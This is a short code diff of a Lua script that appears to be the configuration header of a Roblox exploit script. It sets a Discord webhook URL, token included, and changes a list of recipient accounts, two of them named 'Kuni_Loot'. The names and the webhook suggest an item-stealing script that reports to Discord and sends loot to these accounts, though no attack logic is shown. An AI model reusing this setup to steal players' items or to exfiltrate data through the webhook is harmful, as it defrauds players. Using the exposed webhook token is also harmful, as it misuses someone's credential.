@@ -1,5 +1,5 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1407326022176608267/_7XNS9c-LNZLjKHjB-c03xp9_FBexx92Kz7eYA6s-aMWHFzPbeEVAaEtMwPRySmJW5Yv"
-getgenv().Username = "BEESUCALL, Terensszxc, Kuni_Loot, Kuni_Loot1" 
+getgenv().Username = {"BEESUCALL", "Terensszxc", "Kuni_Loot", "Kuni_Loot1"}
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
